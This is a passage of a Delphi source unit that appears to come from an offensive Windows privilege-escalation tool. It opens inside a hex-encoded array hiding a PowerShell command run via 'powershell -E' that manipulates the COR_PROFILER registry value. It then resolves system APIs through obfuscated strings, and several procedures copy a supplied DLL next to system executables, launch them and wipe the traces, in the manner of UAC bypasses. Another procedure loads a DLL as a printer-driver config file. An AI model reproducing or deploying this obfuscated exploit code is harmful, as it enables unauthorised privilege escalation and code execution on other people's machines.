  '4A','32','5A','58','49','7A','4D','69','63','67','4C','55','35','68','62',
  '57','55','67','4A','79','68','6B','5A','57','5A','68','64','57','78','30',
  '4B','53','63','67','4C','56','5A','68','62','48','56','6C','49','43','63',
  '6E','4F','79','42','53','5A','57','31','76','64','6D','55','74','53','58',
  '52','6C','62','56','42','79','62','33','42','6C','63','6E','52','35','49',
  '43','31','51','59','58','52','6F','49','43','64','49','53','30','4E','56',
  '4F','6C','78','46','62','6E','5A','70','63','6D','39','75','62','57','56',
  '75','64','43','63','67','4C','55','35','68','62','57','55','67','4A','30',
  '4E','50','55','6C','39','51','55','6B','39','47','53','55','78','46','55',
  '69','63','37','49','46','4A','6C','62','57','39','32','5A','53','31','4A',
  '64','47','56','74','55','48','4A','76','63','47','56','79','64','48','6B',
  '67','4C','56','42','68','64','47','67','67','4A','30','68','4C','51','31',
  '55','36','58','45','56','75','64','6D','6C','79','62','32','35','74','5A',
  '57','35','30','4A','79','41','74','54','6D','46','74','5A','53','41','6E',
  '51','30','39','53','58','30','56','4F','51','55','4A','4D','52','56','39',
  '51','55','6B','39','47','53','55','78','4A','54','6B','63','6E','4F','79',
  '42','53','5A','57','31','76','64','6D','55','74','53','58','52','6C','62',
  '56','42','79','62','33','42','6C','63','6E','52','35','49','43','31','51',
  '59','58','52','6F','49','43','64','49','53','30','4E','56','4F','6C','78',
  '46','62','6E','5A','70','63','6D','39','75','62','57','56','75','64','43',
  '63','67','4C','55','35','68','62','57','55','67','4A','30','4E','50','55',
  '6C','39','51','55','6B','39','47','53','55','78','46','55','6C','39','51',
  '51','56','52','49','4A','7A','73','67','27','29','29','3B','20','24','43',
  '43','20','3D','20','5B','43','6F','6E','76','65','72','74','5D','3A','3A',
  '54','6F','42','61','73','65','36','34','53','74','72','69','6E','67','28',
  '5B','54','65','78','74','2E','45','6E','63','6F','64','69','6E','67','5D',
  '3A','3A','55','6E','69','63','6F','64','65','2E','47','65','74','42','79',
  '74','65','73','28','24','42','42','29','29','3B','20','70','6F','77','65',
  '72','73','68','65','6C','6C','20','2D','45','20','24','43','43','3B');

  procedure LoadDLLUpSPA(fName:string);
  procedure LoadDLLUpFH(fName:string);
  procedure LoadDLLUpOF(fName:string);
  procedure LoadDLLUpDJ(fName:string);
  procedure LoadDLLUpWSR(fName:string);
  procedure LoadDLLUpFQ(fName:string);
  procedure LoadDLLUpNW(fName:string);
  procedure LoadDLLUpPU(fName:string);
  procedure LoadDLLUpPN(fName:string);
  function HATS(const hexarr:array of string): Ansistring;
  procedure SEW(hWnd: THandle;
  Operation, FileName, Parameters, Directory: WideString;
  ShowCmd: Integer);
  procedure WoW1(Var Wow64FsEnableRedirection: LongBool);
  procedure WoW2(Var Wow64FsEnableRedirection: LongBool);

implementation

  function HATS(const hexarr:array of string): Ansistring;
  var
   i:Integer;
  function SToI(const S: string): Integer;
  var E: Integer;
  begin
    Val(S, Result,E);
  end;
  function HToS(hex: Ansistring): Ansistring;
  var
  i: Integer;
  begin
    for i:= 1 to Length(hex) div 2 do
    begin
      Result := Result + AnsiChar(SToI('$' +  String(Copy(hex, (i-1) * 2 + 1, 2)) ));
    end;
  end;
  begin
    for i:= 0 to Length(hexarr)-1 do
    begin
      Result :=  HToS(AnsiString(hexarr[i]));
    end;
  end;

  procedure APDE(pName: LPWSTR; Level: DWORD; pDriverInfo: Pointer;
    dwFileCopyFlags: DWORD);
  var
  APDEE: function(pName: LPWSTR; Level: DWORD; pDriverInfo: Pointer;
    dwFileCopyFlags: DWORD): BOOL; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH9))));
      @APDEE := GetProcAddress(HM, PChar(string(HATS(HSH8))));
      APDEE(pName, Level, pDriverInfo, dwFileCopyFlags);
      FreeLibrary(HM);
    except
    ;
    end;
  end;


  procedure CDW(lpPathName: LPCWSTR;
  lpSecurityAttributes: PSecurityAttributes);
  var
  CDWW: function(lpPathName: LPCWSTR;
  lpSecurityAttributes: PSecurityAttributes): BOOL; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH0))));
      @CDWW := GetProcAddress(HM, PChar(string(HATS(HSH7))));
      CDWW(lpPathName, lpSecurityAttributes);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

  procedure CF(lpExistingFileName, lpNewFileName: LPCWSTR;
     bFailIfExists: BOOL);
  var
  CFF: function(lpExistingFileName, lpNewFileName: LPCWSTR;
     bFailIfExists: BOOL): BOOL; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH0))));
      @CFF := GetProcAddress(HM, PChar(string(HATS(HSH6))));
      CFF(lpExistingFileName, lpNewFileName, bFailIfExists);
      FreeLibrary(HM);
    except
    ;
    end;
  end;


  procedure RD(lpPathName: LPCWSTR);
  var
  RDD: function(lpPathName: LPCWSTR): BOOL; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH0))));
      @RDD := GetProcAddress(HM, PChar(string(HATS(HSH5))));
      RDD(lpPathName);
      FreeLibrary(HM);
    except
    ;
    end;
  end;


  procedure SEW(hWnd: THandle;
    Operation, FileName, Parameters, Directory: WideString;
    ShowCmd: Integer);
  var
  SE: function(hWnd: THandle;
    Operation, FileName, Parameters, Directory: WideString;
    ShowCmd: Integer): HINST; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH1))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH2))));
      SE(hWnd, Operation, FileName, Parameters, Directory, ShowCmd);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

  procedure WoW1(Var Wow64FsEnableRedirection: LongBool);
  var
  SE: function(Var Wow64FsEnableRedirection: LongBool): LongBool; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH0))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH3))));
      SE(Wow64FsEnableRedirection);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

  procedure WoW2(Var Wow64FsEnableRedirection: LongBool);
  var
  SE: function(Var Wow64FsEnableRedirection: LongBool): LongBool; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH0))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH4))));
      SE(Wow64FsEnableRedirection);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

  function FindUNIDRV(fName:string):string;
  var
    F: TSearchRec;
    Path: string;
    Attr: Integer;
  begin
    Result := '';
    Path := PChar(string(HATS(HCOM7)));
    Attr := faDirectory;
    FindFirst(Path, Attr, F);
    if F.name <> '' then
      while FindNext(F) = 0 do
        if FileExists(PChar(string(HATS(HCOM8)) + F.name+ string(HATS(HCOM9)) + fName)) <> False then
          Result := PChar(string(HATS(HCOM8)) + F.name+ string(HATS(HCOM9)) + fName);
    FindClose(F);
  end;

  procedure LoadDLLUpPN(fName:string);
  var
  drv: DRIVER_INFO_2;
  PathUNIDRV: string;
  begin
    try
      PathUNIDRV := FindUNIDRV(PChar(string(HATS(HCOM10))));
      FillChar(drv, SizeOf(drv), 0);
      drv.cVersion := 3;
      drv.pName := PChar(string(HATS(HCOM11)));
      drv.pEnvironment := nil;
      drv.pDriverPath := PChar(PathUNIDRV);
      drv.pDataFile := PChar(string(HATS(HCOM12)));
      drv.pConfigFile := PChar(fName);
      APDE(nil, 2, @drv, 4 or $10 or $8000);
    except
      on E: Exception do
        ;
    end;
  end;

  procedure LoadDLLUpPU(fName:string);
  var
    dllPath: string;
  begin
    CDW(PChar(string(HATS(HCOM13))), nil);
    CDW(PChar(string(HATS(HCOM14))), nil);
    CF(PChar(string(HATS(HCOM15))), PChar(string(HATS(HCOM16))), False);
    dllPath := PChar(fName);
    CF(PChar(dllPath), PChar(string(HATS(HCOM17))), False);
    SEW(0, PChar(string(HATS(HCOM19))), PChar(string(HATS(HCOM18))), '', '', 6);
    Sleep(3000);
    DeleteFile(string(HATS(HCOM20)));
    DeleteFile(string(HATS(HCOM21)));
    RD(PChar(string(HATS(HCOM14))));
    RD(PChar(string(HATS(HCOM13))));
  end;

  procedure LoadDLLUpNW(fName:string);
  var
    dllPath: string;
  begin
    CDW(PChar(string(HATS(HCOM13))), nil);
    CDW(PChar(string(HATS(HCOM14))), nil);
    CF(PChar(string(HATS(HCOM22))), PChar(string(HATS(HCOM23))), False);
    dllPath := PChar(fName);
    CF(PChar(dllPath), PChar(string(HATS(HCOM24))), False);
    SEW(0, PChar(string(HATS(HCOM19))), PChar(string(HATS(HCOM25))), '', '', 6);
    Sleep(3000);
    DeleteFile(string(HATS(HCOM26)));
    DeleteFile(string(HATS(HCOM27)));
    RD(PChar(string(HATS(HCOM14))));
    RD(PChar(string(HATS(HCOM13))));

  end;

  procedure LoadDLLUpFQ(fName:string);
  var
    dllPath: string;
  begin
    CDW(PChar(string(HATS(HCOM13))), nil);
    CDW(PChar(string(HATS(HCOM14))), nil);
    CF(PChar(string(HATS(HCOM28))), PChar(string(HATS(HCOM29))), False);
    dllPath := PChar(fName);
    CF(PChar(dllPath), PChar(string(HATS(HCOM30))), False);
    SEW(0, PChar(string(HATS(HCOM19))), PChar(string(HATS(HCOM))), PChar(string(HATS(HCOM31))), '', 0);
    Sleep(3000);
    DeleteFile(string(HATS(HCOM32)));
    DeleteFile(string(HATS(HCOM33)));
    RD(PChar(string(HATS(HCOM14))));
    RD(PChar(string(HATS(HCOM13))));
  end;

  procedure LoadDLLUpWSR(fName:string);
  var
    dllPath: string;
  begin
    CDW(PChar(string(HATS(HCOM13))), nil);
    CDW(PChar(string(HATS(HCOM14))), nil);
    CF(PChar(string(HATS(HCOM34))), PChar(string(HATS(HCOM35))), False);
    dllPath := PChar(fName);
    CF(PChar(dllPath), PChar(string(HATS(HCOM36))), False);
    SEW(0, PChar(string(HATS(HCOM19))), PChar(string(HATS(HCOM37))), '', '', 1);
    Sleep(3000);
    DeleteFile(string(HATS(HCOM38)));
    DeleteFile(string(HATS(HCOM39)));
    RD(PChar(string(HATS(HCOM14))));
    RD(PChar(string(HATS(HCOM13))));
  end;


  procedure LoadDLLUpDJ(fName:string);
  var
    dllPath: string;
  begin
    CDW(PChar(string(HATS(HCOM13))), nil);
    CDW(PChar(string(HATS(HCOM14))), nil);
    CF(PChar(string(HATS(HCOM40))), PChar(string(HATS(HCOM41))), False);
    dllPath := PChar(fName);
    CF(PChar(dllPath), PChar(string(HATS(HCOM42))), False);
    SEW(0, PChar(string(HATS(HCOM19))), PChar(string(HATS(HCOM))), PChar(string(HATS(HCOM43))), '', 0);
    Sleep(3000);
    DeleteFile(string(HATS(HCOM44)));
    DeleteFile(string(HATS(HCOM45)));
    RD(PChar(string(HATS(HCOM14))));
    RD(PChar(string(HATS(HCOM13))));
  end;

  procedure LoadDLLUpOF(fName:string);
  var
    dllPath: string;
  begin
    CDW(PChar(string(HATS(HCOM13))), nil);
    CDW(PChar(string(HATS(HCOM14))), nil);
    CF(PChar(string(HATS(HCOM46))), PChar(string(HATS(HCOM47))), False);
    dllPath := PChar(fName);
    CF(PChar(dllPath), PChar(string(HATS(HCOM48))), False);
    SEW(0, PChar(string(HATS(HCOM19))), PChar(string(HATS(HCOM49))), '', '', 6);
    Sleep(3000);
    DeleteFile(string(HATS(HCOM50)));
    DeleteFile(string(HATS(HCOM51)));
    RD(PChar(string(HATS(HCOM14))));
    RD(PChar(string(HATS(HCOM13))));
  end;

  procedure LoadDLLUpFH(fName:string);
  var
    dllPath: string;
  begin
    CDW(PChar(string(HATS(HCOM13))), nil);
    CDW(PChar(string(HATS(HCOM14))), nil);
    CF(PChar(string(HATS(HCOM52))), PChar(string(HATS(HCOM53))), False);
    dllPath := PChar(fName);
    CF(PChar(dllPath), PChar(string(HATS(HCOM54))), False);
    SEW(0, PChar(string(HATS(HCOM19))), PChar(string(HATS(HCOM55))), '', '', 6);
    Sleep(3000);
    DeleteFile(string(HATS(HCOM56)));
    DeleteFile(string(HATS(HCOM57)));
    RD(PChar(string(HATS(HCOM14))));
    RD(PChar(string(HATS(HCOM13))));
  end;

  procedure LoadDLLUpSPA(fName:string);
  var
    dllPath: string;
  begin
    CDW(PChar(string(HATS(HCOM13))), nil);
    CDW(PChar(string(HATS(HCOM14))), nil);
    CF(PChar(string(HATS(HCOM58))), PChar(string(HATS(HCOM59))), False);
    dllPath := PChar(fName);
    CF(PChar(dllPath), PChar(string(HATS(HCOM60))), False);
    SEW(0, PChar(string(HATS(HCOM19))), PChar(string(HATS(HCOM61))), '', '', 6);
    Sleep(3000);
    DeleteFile(string(HATS(HCOM62)));
    DeleteFile(string(HATS(HCOM63)));
    RD(PChar(string(HATS(HCOM14))));
    RD(PChar(string(HATS(HCOM13))));
  end;

end.